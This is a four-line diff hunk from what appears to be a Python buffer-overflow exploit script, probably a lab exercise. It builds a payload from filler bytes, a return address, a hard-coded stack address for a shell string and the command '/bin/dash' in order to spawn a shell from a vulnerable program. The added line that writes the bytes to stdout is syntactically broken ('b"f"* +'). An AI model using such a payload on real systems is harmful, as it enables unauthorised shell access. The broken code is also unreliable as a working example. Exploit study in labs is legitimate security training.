@@ -8,3 +8,4 @@ dummy_ret = "f"*4
 arg= 0xbffefaa8.to_bytes(4, "little") #wherever shell code string is
 command = "/bin/dash"
 print (filler + ret  + arg + command)
+sys.stdout.buffer.write(filler + ret+ b"f"* + arg+ command)
